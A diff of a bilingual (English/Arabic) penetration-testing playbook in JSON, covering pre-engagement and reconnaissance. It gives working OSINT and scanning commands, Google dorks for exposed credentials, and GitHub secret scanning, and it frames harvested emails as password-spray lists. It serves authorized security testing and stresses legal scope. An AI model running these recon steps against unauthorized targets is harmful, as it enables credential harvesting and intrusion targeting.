@@ -1,175 +1,376 @@
 [
   {
     "id": "pre",
-    "label": "Pre-Engagement",
-    "short": "Pre",
-    "icon": "\ud83d\udccb",
+    "label": {
+      "en": "Pre-Engagement",
+      "ar": "ما قبل المهمة"
+    },
+    "short": {
+      "en": "Pre",
+      "ar": "تمهيد"
+    },
+    "icon": "📋",
     "color": "#3b82f6",
-    "desc": "Legal, scoping, threat modeling, environment setup",
+    "desc": {
+      "en": "Legal, scoping, threat modeling, environment setup",
+      "ar": "الجوانب القانونية، تحديد النطاق، نمذجة التهديدات، إعداد البيئة"
+    },
     "steps": [
       {
         "id": "p1",
-        "title": "Initial Client Meeting",
+        "title": {
+          "en": "Initial Client Meeting",
+          "ar": "الاجتماع الأولي مع العميل"
+        },
         "priority": "critical",
-        "summary": "Establish relationship and objectives before any technical work begins.",
+        "summary": {
+          "en": "Establish relationship and objectives before any technical work begins.",
+          "ar": "بناء العلاقة وتحديد الأهداف قبل بدء أي عمل تقني."
+        },
         "checklist": [
-          "Identify stakeholders and primary security contact",
-          "Understand business type, industry, and regulatory environment",
-          "Discuss prior incidents and previous penetration tests",
-          "Identify compliance requirements: PCI-DSS, HIPAA, ISO 27001, SOC 2",
-          "Determine testing type: black-box / grey-box / white-box",
-          "Discuss timeline, budget, and deliverables",
-          "Schedule scope definition follow-up"
+          {
+            "en": "Identify stakeholders and primary security contact",
+            "ar": "تحديد أصحاب المصلحة وجهة الاتصال الأمنية الرئيسية"
+          },
+          {
+            "en": "Understand business type, industry, and regulatory environment",
+            "ar": "فهم نوع النشاط التجاري والقطاع والبيئة التنظيمية"
+          },
+          {
+            "en": "Discuss prior incidents and previous penetration tests",
+            "ar": "مناقشة الحوادث السابقة واختبارات الاختراق السابقة"
+          },
+          {
+            "en": "Identify compliance requirements: PCI-DSS, HIPAA, ISO 27001, SOC 2",
+            "ar": "تحديد متطلبات الامتثال: PCI-DSS، HIPAA، ISO 27001، SOC 2"
+          },
+          {
+            "en": "Determine testing type: black-box / grey-box / white-box",
+            "ar": "تحديد نوع الاختبار: صندوق أسود / رمادي / أبيض"
+          },
+          {
+            "en": "Discuss timeline, budget, and deliverables",
+            "ar": "مناقشة الجدول الزمني والميزانية والمُخرجات"
+          },
+          {
+            "en": "Schedule scope definition follow-up",
+            "ar": "جدولة اجتماع متابعة لتحديد النطاق"
+          }
         ],
         "commands": [
           {
             "id": "p1c1",
-            "title": "Pre-Meeting OSINT \u2014 theHarvester",
-            "purpose": "Know their tech stack and employees before the meeting",
+            "title": {
+              "en": "Pre-Meeting OSINT — theHarvester",
+              "ar": "استطلاع ما قبل الاجتماع — theHarvester"
+            },
+            "purpose": {
+              "en": "Know their tech stack and employees before the meeting",
+              "ar": "معرفة حزمة التقنيات والموظفين قبل الاجتماع"
+            },
             "cmd": "theHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo -l 500 -f ~/pentests/{CLIENT}/recon/pre_meeting.html",
             "example": "theHarvester -d acmecorp.com -b google,bing,linkedin -l 500 -f pre_meeting.html",
             "flags": [
               {
                 "f": "-d",
-                "d": "Target domain"
+                "d": {
+                  "en": "Target domain",
+                  "ar": "النطاق المستهدف"
+                }
               },
               {
                 "f": "-b",
-                "d": "Data sources (comma-separated)"
+                "d": {
+                  "en": "Data sources (comma-separated)",
+                  "ar": "مصادر البيانات (مفصولة بفواصل)"
+                }
               },
               {
                 "f": "-l 500",
-                "d": "Result limit per source"
+                "d": {
+                  "en": "Result limit per source",
+                  "ar": "حد النتائج لكل مصدر"
+                }
               },
               {
                 "f": "-f",
-                "d": "HTML output (open in browser)"
+                "d": {
+                  "en": "HTML output (open in browser)",
+                  "ar": "إخراج HTML (يُفتح في المتصفح)"
+                }
               }
             ],
-            "note": "Do this before the meeting. Referencing their tech stack builds instant credibility.",
-            "out": "Emails, employee names, subdomains, IPs from public sources"
+            "note": {
+              "en": "Do this before the meeting. Referencing their tech stack builds instant credibility.",
+              "ar": "افعل هذا قبل الاجتماع. الإشارة إلى حزمة تقنياتهم تبني مصداقية فورية."
+            },
+            "out": {
+              "en": "Emails, employee names, subdomains, IPs from public sources",
+              "ar": "بريد إلكتروني، أسماء موظفين، نطاقات فرعية، عناوين IP من مصادر عامة"
+            }
           },
           {
             "id": "p1c2",
-            "title": "Shodan Pre-Meeting Recon",
-            "purpose": "View public attack surface passively before the call",
+            "title": {
+              "en": "Shodan Pre-Meeting Recon",
+              "ar": "استطلاع Shodan قبل الاجتماع"
+            },
+            "purpose": {
+              "en": "View public attack surface passively before the call",
+              "ar": "عرض سطح الهجوم العام بشكل سلبي قبل المكالمة"
+            },
             "cmd": "shodan search 'org:\"{COMPANY}\"' --fields ip_str,port,hostnames,vulns\nshodan host {IP_ADDRESS}",
             "example": "shodan search 'org:\"Acme Corporation\"' --fields ip_str,port,hostnames,vulns",
             "flags": [
               {
                 "f": "org:",
-                "d": "Filter by organization name"
+                "d": {
+                  "en": "Filter by organization name",
+                  "ar": "تصفية حسب اسم المنظمة"
+                }
               },
               {
                 "f": "ssl:",
-                "d": "Search by SSL cert content"
+                "d": {
+                  "en": "Search by SSL cert content",
+                  "ar": "بحث حسب محتوى شهادة SSL"
+                }
               },
               {
                 "f": "shodan host IP",
-                "d": "Full deep-dive on specific IP"
+                "d": {
+                  "en": "Full deep-dive on specific IP",
+                  "ar": "تحليل عميق كامل لعنوان IP محدد"
+                }
               }
             ],
-            "note": "Setup: pip3 install shodan && shodan init YOUR_API_KEY (free at shodan.io)",
-            "out": "IPs, ports, banners, CVEs \u2014 zero contact with their network"
+            "note": {
+              "en": "Setup: pip3 install shodan && shodan init YOUR_API_KEY (free at shodan.io)",
+              "ar": "الإعداد: pip3 install shodan && shodan init YOUR_API_KEY (مجاني على shodan.io)"
+            },
+            "out": {
+              "en": "IPs, ports, banners, CVEs — zero contact with their network",
+              "ar": "عناوين IP، منافذ، بصمات خدمة، CVEs — دون أي تواصل مع شبكتهم"
+            }
           }
         ],
         "tools": [
           "theHarvester",
           "shodan-cli"
         ],
-        "deliverable": "Meeting notes + initial scope proposal draft",
-        "tip": "Reference a specific Shodan finding in the meeting. Knowing their exposed RDP before they tell you instantly separates you from junior testers."
+        "deliverable": {
+          "en": "Meeting notes + initial scope proposal draft",
+          "ar": "محضر الاجتماع + مسودة اقتراح النطاق الأولي"
+        },
+        "tip": {
+          "en": "Reference a specific Shodan finding in the meeting. Knowing their exposed RDP before they tell you instantly separates you from junior testers.",
+          "ar": "اذكر نتيجة محددة من Shodan خلال الاجتماع. معرفتك بمنفذ RDP المكشوف لديهم قبل أن يخبروك تميّزك فوراً عن المختبرين المبتدئين."
+        }
       },
       {
         "id": "p2",
-        "title": "Legal Authorization & Scope",
+        "title": {
+          "en": "Legal Authorization & Scope",
+          "ar": "التفويض القانوني والنطاق"
+        },
         "priority": "critical",
-        "summary": "Every scope item in writing. ALL legal docs signed before touching any system.",
+        "summary": {
+          "en": "Every scope item in writing. ALL legal docs signed before touching any system.",
+          "ar": "كل بند في النطاق موثَّق كتابياً. جميع المستندات القانونية موقّعة قبل لمس أي نظام."
+        },
         "checklist": [
-          "All in-scope IP ranges and CIDR blocks documented and signed",
-          "All in-scope domains and subdomains listed",
-          "Out-of-scope systems explicitly documented",
-          "NDA signed by both parties",
-          "Rules of Engagement (ROE) signed by authorized executive",
-          "Written Authorization Letter on company letterhead",
-          "Emergency 24/7 contact list",
-          "Testing hours agreed (business hours / 24-7 / weekends)",
-          "Social engineering in/out of scope confirmed"
+          {
+            "en": "All in-scope IP ranges and CIDR blocks documented and signed",
+            "ar": "توثيق وتوقيع جميع نطاقات IP وكتل CIDR ضمن النطاق"
+          },
+          {
+            "en": "All in-scope domains and subdomains listed",
+            "ar": "سرد جميع النطاقات والنطاقات الفرعية ضمن النطاق"
+          },
+          {
+            "en": "Out-of-scope systems explicitly documented",
+            "ar": "توثيق الأنظمة خارج النطاق صراحةً"
+          },
+          {
+            "en": "NDA signed by both parties",
+            "ar": "توقيع اتفاقية السرية (NDA) من الطرفين"
+          },
+          {
+            "en": "Rules of Engagement (ROE) signed by authorized executive",
+            "ar": "توقيع قواعد الاشتباك (ROE) من قبل مسؤول تنفيذي مخوَّل"
+          },
+          {
+            "en": "Written Authorization Letter on company letterhead",
+            "ar": "خطاب تفويض كتابي على ورق رسمي للشركة"
+          },
+          {
+            "en": "Emergency 24/7 contact list",
+            "ar": "قائمة اتصال طوارئ على مدار الساعة"
+          },
+          {
+            "en": "Testing hours agreed (business hours / 24-7 / weekends)",
+            "ar": "الاتفاق على ساعات الاختبار (ساعات العمل / على مدار الساعة / عطلات نهاية الأسبوع)"
+          },
+          {
+            "en": "Social engineering in/out of scope confirmed",
+            "ar": "تأكيد ما إذا كانت الهندسة الاجتماعية ضمن النطاق أم لا"
+          }
         ],
         "commands": [
           {
             "id": "p2c1",
-            "title": "Verify IP and Domain Ownership",
-            "purpose": "Confirm all scope items belong to the client before testing",
+            "title": {
+              "en": "Verify IP and Domain Ownership",
+              "ar": "التحقق من ملكية IP والنطاق"
+            },
+            "purpose": {
+              "en": "Confirm all scope items belong to the client before testing",
+              "ar": "تأكيد أن جميع بنود النطاق تعود للعميل قبل الاختبار"
+            },
             "cmd": "whois {IP_ADDRESS} | grep -E 'OrgName|Organization|NetName|CIDR|NetRange'\nwhois {DOMAIN} | grep -E 'Registrant|Organization|Admin'",
             "example": "whois 203.0.113.10 | grep -E 'OrgName|NetRange'",
             "flags": [
               {
                 "f": "grep -E",
-                "d": "Filter to ownership-relevant lines only"
+                "d": {
+                  "en": "Filter to ownership-relevant lines only",
+                  "ar": "التصفية إلى أسطر متعلقة بالملكية فقط"
+                }
               }
             ],
-            "note": "Document this output as part of your legal authorization package. Testing systems you don't own is illegal.",
-            "out": "Organization name, IP block ownership, domain registrant"
+            "note": {
+              "en": "Document this output as part of your legal authorization package. Testing systems you don't own is illegal.",
+              "ar": "وثّق هذا المخرج كجزء من حزمة التفويض القانوني. اختبار أنظمة لا تملكها أمر غير قانوني."
+            },
+            "out": {
+              "en": "Organization name, IP block ownership, domain registrant",
+              "ar": "اسم المنظمة، ملكية كتلة IP، مسجِّل النطاق"
+            }
           }
         ],
         "tools": [
           "whois"
         ],
-        "deliverable": "Signed SOW + NDA + ROE + Authorization Letter",
-        "tip": "Carry the authorization letter at ALL times during testing. If law enforcement contacts you, show it immediately."
+        "deliverable": {
+          "en": "Signed SOW + NDA + ROE + Authorization Letter",
+          "ar": "عقد عمل (SOW) موقّع + اتفاقية سرية (NDA) + قواعد الاشتباك (ROE) + خطاب تفويض"
+        },
+        "tip": {
+          "en": "Carry the authorization letter at ALL times during testing. If law enforcement contacts you, show it immediately.",
+          "ar": "احمل خطاب التفويض معك طوال فترة الاختبار. إن تواصلت معك جهات إنفاذ القانون، أظهره فوراً."
+        }
       },
       {
         "id": "p3",
-        "title": "Environment Setup",
+        "title": {
+          "en": "Environment Setup",
+          "ar": "إعداد بيئة العمل"
+        },
         "priority": "high",
-        "summary": "Configure attack machine, logging, and project structure before starting.",
+        "summary": {
+          "en": "Configure attack machine, logging, and project structure before starting.",
+          "ar": "تجهيز جهاز الهجوم، التسجيل، وهيكلية المشروع قبل البدء."
+        },
         "checklist": [
-          "Fresh Kali Linux VM on isolated network",
-          "VM snapshot taken before testing",
-          "Project directory structure created",
-          "Terminal logging enabled",
-          "All tools updated",
-          "SecLists wordlists installed"
+          {
+            "en": "Fresh Kali Linux VM on isolated network",
+            "ar": "جهاز Kali Linux افتراضي جديد على شبكة معزولة"
+          },
+          {
+            "en": "VM snapshot taken before testing",
+            "ar": "أخذ نسخة (snapshot) من الجهاز الافتراضي قبل الاختبار"
+          },
+          {
+            "en": "Project directory structure created",
+            "ar": "إنشاء هيكلية مجلدات المشروع"
+          },
+          {
+            "en": "Terminal logging enabled",
+            "ar": "تفعيل تسجيل الطرفية (Terminal logging)"
+          },
+          {
+            "en": "All tools updated",
+            "ar": "تحديث جميع الأدوات"
+          },
+          {
+            "en": "SecLists wordlists installed",
+            "ar": "تثبيت قوائم كلمات SecLists"
+          }
         ],
         "commands": [
           {
             "id": "p3c1",
-            "title": "Project Structure + Terminal Logging",
-            "purpose": "Organized evidence collection and automatic timestamped command log",
+            "title": {
+              "en": "Project Structure + Terminal Logging",
+              "ar": "هيكلية المشروع وتسجيل الطرفية"
+            },
+            "purpose": {
+              "en": "Organized evidence collection and automatic timestamped command log",
+              "ar": "جمع أدلة منظّم وسجل أوامر موسوم بالوقت تلقائياً"
+            },
             "cmd": "mkdir -p ~/pentests/{CLIENT}/{recon,scans,exploitation,post-exploit,evidence,loot,report}\ncd ~/pentests/{CLIENT}\n\n# Enable terminal logging:\nscript -a -t 2>terminal_timing.log terminal_session.log\n# Stop: exit  |  Replay: scriptreplay terminal_timing.log terminal_session.log",
             "example": "mkdir -p ~/pentests/AcmeCorp/{recon,scans,exploitation,post-exploit,evidence,report}",
             "flags": [
               {
                 "f": "-p",
-                "d": "Create parent directories"
+                "d": {
+                  "en": "Create parent directories",
+                  "ar": "إنشاء المجلدات الأصل"
+                }
               },
               {
                 "f": "-a",
-                "d": "script: append to log"
+                "d": {
+                  "en": "script: append to log",
+                  "ar": "script: الإلحاق بالسجل"
+                }
               },
               {
                 "f": "-t",
-                "d": "script: record timing for replay"
+                "d": {
+                  "en": "script: record timing for replay",
+                  "ar": "script: تسجيل التوقيت لإعادة التشغيل"
+                }
               }
             ],
-            "note": "Run script logging at the start of every session. Every command timestamped = your legal and technical evidence.",
-            "out": "Organized project directory + timestamped terminal log"
+            "note": {
+              "en": "Run script logging at the start of every session. Every command timestamped = your legal and technical evidence.",
+              "ar": "فعّل تسجيل script في بداية كل جلسة. كل أمر موسوم بالوقت = دليلك القانوني والتقني."
+            },
+            "out": {
+              "en": "Organized project directory + timestamped terminal log",
+              "ar": "هيكلية مجلد مشروع منظّمة + سجل طرفية موسوم بالوقت"
+            }
           },
           {
             "id": "p3c2",
-            "title": "Update Tools + SecLists",
-            "purpose": "Start every engagement with current tools and wordlists",
+            "title": {
+              "en": "Update Tools + SecLists",
+              "ar": "تحديث الأدوات وSecLists"
+            },
+            "purpose": {
+              "en": "Start every engagement with current tools and wordlists",
+              "ar": "ابدأ كل مهمة بأدوات وقوائم كلمات محدّثة"
+            },
             "cmd": "sudo apt update && sudo apt upgrade -y\nsudo apt install -y seclists nmap masscan gobuster ffuf nikto sqlmap hydra crackmapexec impacket-scripts bloodhound neo4j evil-winrm responder\nnuclei -update-templates && subfinder -up && httpx -up",
             "example": "sudo apt update && sudo apt upgrade -y && sudo apt install -y seclists",
             "flags": [
               {
                 "f": "-y",
-                "d": "Auto-confirm all prompts"
+                "d": {
+                  "en": "Auto-confirm all prompts",
+                  "ar": "تأكيد تلقائي لجميع المطالبات"
+                }
               }
             ],
-            "note": "Key SecLists: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | /usr/share/wordlists/rockyou.txt",
-            "out": "All tools updated, SecLists at /usr/share/seclists/"
+            "note": {
+              "en": "Key SecLists: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | /usr/share/wordlists/rockyou.txt",
+              "ar": "قوائم SecLists رئيسية: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | /usr/share/wordlists/rockyou.txt"
+            },
+            "out": {
+              "en": "All tools updated, SecLists at /usr/share/seclists/",
+              "ar": "جميع الأدوات محدّثة، SecLists في /usr/share/seclists/"
+            }
           }
         ],
         "tools": [
@@ -177,121 +378,247 @@
           "VirtualBox/VMware",
           "SecLists"
         ],
-        "deliverable": "Setup checklist + clean VM snapshot",
-        "tip": "Take a VM snapshot before starting every engagement. Proves your attack machine state and lets you restore cleanly."
+        "deliverable": {
+          "en": "Setup checklist + clean VM snapshot",
+          "ar": "قائمة فحص الإعداد + نسخة VM نظيفة"
+        },
+        "tip": {
+          "en": "Take a VM snapshot before starting every engagement. Proves your attack machine state and lets you restore cleanly.",
+          "ar": "خذ نسخة (snapshot) من الجهاز الافتراضي قبل بدء كل مهمة. تُثبت حالة جهاز الهجوم وتتيح لك الاستعادة بشكل نظيف."
+        }
       }
     ]
   },
   {
     "id": "recon",
-    "label": "Reconnaissance",
-    "short": "Recon",
-    "icon": "\ud83d\udd0d",
+    "label": {
+      "en": "Reconnaissance",
+      "ar": "الاستطلاع"
+    },
+    "short": {
+      "en": "Recon",
+      "ar": "استطلاع"
+    },
+    "icon": "🔍",
     "color": "#8b5cf6",
-    "desc": "Passive OSINT + active information gathering",
+    "desc": {
+      "en": "Passive OSINT + active information gathering",
+      "ar": "جمع معلومات استخباراتي سلبي ونشط"
+    },
     "steps": [
       {
         "id": "r1",
-        "title": "Passive OSINT",
+        "title": {
+          "en": "Passive OSINT",
+          "ar": "الاستطلاع السلبي"
+        },
         "priority": "critical",
-        "summary": "Maximum intelligence without touching target systems. Spend at least 2-3 hours here \u2014 completely risk-free.",
+        "summary": {
+          "en": "Maximum intelligence without touching target systems. Spend at least 2-3 hours here — completely risk-free.",
+          "ar": "أقصى قدر من المعلومات الاستخباراتية دون لمس أنظمة الهدف. اقضِ ساعتين إلى ثلاث ساعات على الأقل هنا — خالٍ تماماً من المخاطر."
+        },
         "checklist": [
-          "DNS record enumeration (A, MX, TXT, NS, SOA, AXFR attempt)",
-          "Certificate transparency \u2014 crt.sh",
-          "Amass passive subdomain enumeration",
-          "Subfinder passive + httpx probe for live hosts",
-          "theHarvester multi-source harvest",
-          "Google dorks: files, panels, sensitive data",
-          "Shodan / Censys passive infrastructure scan",
-          "GitHub / GitLab secret scanning (leaked creds, API keys)",
-          "Wayback Machine \u2014 historical URLs",
-          "LinkedIn + job postings \u2014 tech stack discovery"
+          {
+            "en": "DNS record enumeration (A, MX, TXT, NS, SOA, AXFR attempt)",
+            "ar": "حصر سجلات DNS (A، MX، TXT، NS، SOA، محاولة AXFR)"
+          },
+          {
+            "en": "Certificate transparency — crt.sh",
+            "ar": "شفافية الشهادات — crt.sh"
+          },
+          {
+            "en": "Amass passive subdomain enumeration",
+            "ar": "حصر سلبي للنطاقات الفرعية عبر Amass"
+          },
+          {
+            "en": "Subfinder passive + httpx probe for live hosts",
+            "ar": "فحص سلبي عبر Subfinder + فحص httpx للمضيفين الحيّين"
+          },
+          {
+            "en": "theHarvester multi-source harvest",
+            "ar": "جمع متعدد المصادر عبر theHarvester"
+          },
+          {
+            "en": "Google dorks: files, panels, sensitive data",
+            "ar": "مزايا بحث Google: ملفات، لوحات تحكم، بيانات حساسة"
+          },
+          {
+            "en": "Shodan / Censys passive infrastructure scan",
+            "ar": "فحص بنية تحتية سلبي عبر Shodan / Censys"
+          },
+          {
+            "en": "GitHub / GitLab secret scanning (leaked creds, API keys)",
+            "ar": "فحص الأسرار على GitHub / GitLab (بيانات اعتماد ومفاتيح API مسرّبة)"
+          },
+          {
+            "en": "Wayback Machine — historical URLs",
+            "ar": "Wayback Machine — الروابط التاريخية"
+          },
+          {
+            "en": "LinkedIn + job postings — tech stack discovery",
+            "ar": "LinkedIn وإعلانات الوظائف — اكتشاف حزمة التقنيات المستخدمة"
+          }
         ],
         "commands": [
           {
             "id": "r1c1",
-            "title": "DNS + crt.sh + Amass + Subfinder + httpx",
-            "purpose": "Complete passive subdomain and DNS enumeration pipeline",
+            "title": {
+              "en": "DNS + crt.sh + Amass + Subfinder + httpx",
+              "ar": "DNS + crt.sh + Amass + Subfinder + httpx"
+            },
+            "purpose": {
+              "en": "Complete passive subdomain and DNS enumeration pipeline",
+              "ar": "خط أنابيب كامل لحصر النطاقات الفرعية وDNS بشكل سلبي"
+            },
             "cmd": "# DNS records:\ndnsrecon -d {DOMAIN} -a -o ~/pentests/{CLIENT}/recon/dnsrecon.xml\ndig {DOMAIN} ANY +noall +answer\n\n# Certificate transparency:\ncurl -s 'https://crt.sh/?q=%.{DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u | tee ~/pentests/{CLIENT}/recon/crtsh.txt\n\n# Subdomain enumeration:\namass enum -passive -d {DOMAIN} -o ~/pentests/{CLIENT}/recon/amass.txt\nsubfinder -d {DOMAIN} -all -recursive -o ~/pentests/{CLIENT}/recon/subfinder.txt\n\n# Merge and probe live hosts:\ncat ~/pentests/{CLIENT}/recon/{crtsh,amass,subfinder}.txt | sort -u > all_subs.txt\nhttpx -l all_subs.txt -title -status-code -tech-detect -o ~/pentests/{CLIENT}/recon/live_hosts.txt",
             "example": "subfinder -d acmecorp.com -all -recursive -o subfinder.txt\nhttpx -l subfinder.txt -title -status-code -tech-detect -o live_hosts.txt",
             "flags": [
               {
                 "f": "-a",
-                "d": "dnsrecon: all record types"
+                "d": {
+                  "en": "dnsrecon: all record types",
+                  "ar": "dnsrecon: جميع أنواع السجلات"
+                }
               },
               {
                 "f": "%.DOMAIN",
-                "d": "crt.sh: wildcard finds all subdomain certs"
+                "d": {
+                  "en": "crt.sh: wildcard finds all subdomain certs",
+                  "ar": "crt.sh: البحث الشامل يجد جميع شهادات النطاقات الفرعية"
+                }
               },
               {
                 "f": "-passive",
-                "d": "amass: no direct target contact"
+                "d": {
+                  "en": "amass: no direct target contact",
+                  "ar": "amass: دون تواصل مباشر مع الهدف"
+                }
               },
               {
                 "f": "-all -recursive",
-                "d": "subfinder: all sources + recursive"
+                "d": {
+                  "en": "subfinder: all sources + recursive",
+                  "ar": "subfinder: جميع المصادر + تكراري"
+                }
               },
               {
                 "f": "-tech-detect",
-                "d": "httpx: detect web technologies"
+                "d": {
+                  "en": "httpx: detect web technologies",
+                  "ar": "httpx: اكتشاف تقنيات الويب"
+                }
               }
             ],
-            "note": "live_hosts.txt is your web attack surface. Every line is a target. crt.sh often finds staging/dev subdomains forgotten by the client.",
-            "out": "All live web hosts with status codes, titles, and technology stacks"
+            "note": {
+              "en": "live_hosts.txt is your web attack surface. Every line is a target. crt.sh often finds staging/dev subdomains forgotten by the client.",
+              "ar": "live_hosts.txt هو سطح هجوم الويب لديك. كل سطر هدف. crt.sh غالباً ما يجد نطاقات تجريبية/تطويرية نسيها العميل."
+            },
+            "out": {
+              "en": "All live web hosts with status codes, titles, and technology stacks",
+              "ar": "جميع مضيفي الويب الحيّين مع رموز الحالة والعناوين وحزم التقنيات"
+            }
           },
           {
             "id": "r1c2",
-            "title": "theHarvester + GitHub Secrets",
-            "purpose": "Email and employee harvest + leaked credential detection",
+            "title": {
+              "en": "theHarvester + GitHub Secrets",
+              "ar": "theHarvester + أسرار GitHub"
+            },
+            "purpose": {
+              "en": "Email and employee harvest + leaked credential detection",
+              "ar": "جمع البريد الإلكتروني والموظفين + كشف بيانات الاعتماد المسرّبة"
+            },
             "cmd": "# theHarvester:\ntheHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo,crtsh,hackertarget -l 500 -f ~/pentests/{CLIENT}/recon/harvester.html\n\n# GitHub secret scanning:\npip3 install trufflehog --break-system-packages\ntrufflehog github --org={ORG} --token={GITHUB_PAT}\ntrufflehog git https://github.com/{ORG}/{REPO}",
             "example": "theHarvester -d acmecorp.com -b google,bing,linkedin,crtsh -l 500 -f harvester.html\ntrufflehog github --org=acmecorp --token=ghp_yourtoken",
             "flags": [
               {
                 "f": "-b",
-                "d": "Comma-separated sources"
+                "d": {
+                  "en": "Comma-separated sources",
+                  "ar": "مصادر مفصولة بفواصل"
+                }
               },
               {
                 "f": "-l",
-                "d": "Result limit per source"
+                "d": {
+                  "en": "Result limit per source",
+                  "ar": "حد النتائج لكل مصدر"
+                }
               },
               {
                 "f": "--org",
-                "d": "Scan entire GitHub organization"
+                "d": {
+                  "en": "Scan entire GitHub organization",
+                  "ar": "فحص منظمة GitHub بأكملها"
+                }
               },
               {
                 "f": "--token",
-                "d": "GitHub PAT needed for org scanning"
+                "d": {
+                  "en": "GitHub PAT needed for org scanning",
+                  "ar": "يلزم رمز GitHub PAT لفحص المنظمات"
+                }
               }
             ],
-            "note": "Emails = password spray list. GitHub leaked API key = critical finding with zero risk. Always check GitHub before touching their network.",
-            "out": "Emails, employees (theHarvester) + leaked secrets with file locations (trufflehog)"
+            "note": {
+              "en": "Emails = password spray list. GitHub leaked API key = critical finding with zero risk. Always check GitHub before touching their network.",
+              "ar": "البريد الإلكتروني = قائمة رش كلمات المرور. مفتاح API مسرّب على GitHub = نتيجة حرجة بمخاطرة صفرية. افحص GitHub دائماً قبل لمس شبكتهم."
+            },
+            "out": {
+              "en": "Emails, employees (theHarvester) + leaked secrets with file locations (trufflehog)",
+              "ar": "بريد إلكتروني وموظفون (theHarvester) + أسرار مسرّبة مع مواقع الملفات (trufflehog)"
+            }
           },
           {
             "id": "r1c3",
-            "title": "Google Dorks + Shodan + Wayback",
-            "purpose": "Sensitive data indexed by search engines, passive infra scan, historical URLs",
+            "title": {
+              "en": "Google Dorks + Shodan + Wayback",
+              "ar": "Google Dorks + Shodan + Wayback"
+            },
+            "purpose": {
+              "en": "Sensitive data indexed by search engines, passive infra scan, historical URLs",
+              "ar": "بيانات حساسة مفهرسة في محركات البحث، فحص بنية تحتية سلبي، روابط تاريخية"
+            },
             "cmd": "# Google dorks (paste one at a time):\nsite:{DOMAIN} filetype:pdf OR filetype:xlsx OR filetype:docx\nsite:{DOMAIN} intitle:\"index of\" -html\nsite:{DOMAIN} ext:env OR ext:cfg OR ext:bak OR ext:sql\nsite:{DOMAIN} \"password\" OR \"api_key\" OR \"credentials\"\nsite:{DOMAIN} inurl:admin OR inurl:login OR inurl:dashboard\n\n# Shodan:\nshodan search 'org:\"{COMPANY}\"' --fields ip_str,port,hostnames,vulns\nshodan host {IP_ADDRESS}\n\n# Wayback Machine:\ngo install github.com/tomnomnom/waybackurls@latest\nwaybackurls {DOMAIN} | grep -iE '.php|.asp|.env|.sql|.bak|admin|config|backup' | tee wayback.txt",
             "example": "site:acmecorp.com ext:env\nshodan search 'org:\"Acme Corporation\"' --fields ip_str,port,hostnames,vulns\nwaybackurls acmecorp.com | grep '.env'",
             "flags": [
               {
                 "f": "site:",
-                "d": "Restrict to domain"
+                "d": {
+                  "en": "Restrict to domain",
+                  "ar": "الحصر على نطاق محدد"
+                }
               },
               {
                 "f": "filetype:/ext:",
-                "d": "Filter by file type"
+                "d": {
+                  "en": "Filter by file type",
+                  "ar": "التصفية حسب نوع الملف"
+                }
               },
               {
                 "f": "intitle:",
-                "d": "Search page title"
+                "d": {
+                  "en": "Search page title",
+                  "ar": "البحث في عنوان الصفحة"
+                }
               },
               {
                 "f": "inurl:",
-                "d": "Search URL path"
+                "d": {
+                  "en": "Search URL path",
+                  "ar": "البحث في مسار الرابط"
+                }
               }
             ],
-            "note": "Full dork DB: exploit-db.com/google-hacking-database (4000+ proven dorks). Old .env files often still accessible at historical URLs.",
-            "out": "Exposed docs, login panels, directory listings, config files + historical sensitive URLs"
+            "note": {
+              "en": "Full dork DB: exploit-db.com/google-hacking-database (4000+ proven dorks). Old .env files often still accessible at historical URLs.",
+              "ar": "قاعدة بيانات شاملة: exploit-db.com/google-hacking-database (أكثر من 4000 استعلام مُثبت). ملفات .env القديمة غالباً ما تبقى متاحة عبر الروابط التاريخية."
+            },
+            "out": {
+              "en": "Exposed docs, login panels, directory listings, config files + historical sensitive URLs",
+              "ar": "مستندات مكشوفة، لوحات تسجيل دخول، قوائم دلائل، ملفات إعداد + روابط حساسة تاريخية"
+            }
           }
         ],
         "tools": [
@@ -304,89 +631,179 @@
           "shodan-cli",
           "waybackurls"
         ],
-        "deliverable": "OSINT Report: assets, emails, subdomains, leaked credentials discovered",
-        "tip": "A leaked GitHub API key before touching their network = critical finding with zero risk to you. Always start here."
+        "deliverable": {
+          "en": "OSINT Report: assets, emails, subdomains, leaked credentials discovered",
+          "ar": "تقرير استطلاع: الأصول، البريد الإلكتروني، النطاقات الفرعية، بيانات الاعتماد المسرّبة المكتشفة"
+        },
+        "tip": {
+          "en": "A leaked GitHub API key before touching their network = critical finding with zero risk to you. Always start here.",
+          "ar": "مفتاح API مسرّب على GitHub قبل لمس شبكتهم = نتيجة حرجة بمخاطرة صفرية عليك. ابدأ من هنا دائماً."
+        }
       },
       {
         "id": "r2",
-        "title": "Active Reconnaissance",
+        "title": {
+          "en": "Active Reconnaissance",
+          "ar": "الاستطلاع النشط"
+        },
         "priority": "high",
-        "summary": "Direct contact with target: port scanning, service detection, web enumeration.",
+        "summary": {
+          "en": "Direct contact with target: port scanning, service detection, web enumeration.",
+          "ar": "تواصل مباشر مع الهدف: فحص المنافذ، تحديد الخدمات، حصر الويب."
+        },
         "checklist": [
-          "Live host discovery \u2014 ping sweep + TCP fallback",
-          "masscan \u2014 all 65535 TCP ports",
-          "nmap \u2014 service/version on discovered ports",
-          "UDP scan \u2014 top 100 common ports",
-          "gobuster \u2014 web directory brute force",
-          "ffuf \u2014 VHost, param, API fuzzing",
-          "whatweb + wafw00f \u2014 tech and WAF fingerprinting"
+          {
+            "en": "Live host discovery — ping sweep + TCP fallback",
+            "ar": "اكتشاف المضيفين الحيّين — ping sweep مع احتياط TCP"
+          },
+          {
+            "en": "masscan — all 65535 TCP ports",
+            "ar": "masscan — جميع منافذ TCP الـ65535"
+          },
+          {
+            "en": "nmap — service/version on discovered ports",
+            "ar": "nmap — تحديد الخدمة/الإصدار على المنافذ المكتشفة"
+          },
+          {
+            "en": "UDP scan — top 100 common ports",
+            "ar": "فحص UDP — أكثر 100 منفذ شيوعاً"
+          },
+          {
+            "en": "gobuster — web directory brute force",
+            "ar": "gobuster — تخمين دلائل الويب"
+          },
+          {
+            "en": "ffuf — VHost, param, API fuzzing",
+            "ar": "ffuf — فحص VHost والمعاملات وواجهات API"
+          },
+          {
+            "en": "whatweb + wafw00f — tech and WAF fingerprinting",
+            "ar": "whatweb وwafw00f — بصمة التقنية وجدار الحماية"
+          }
         ],
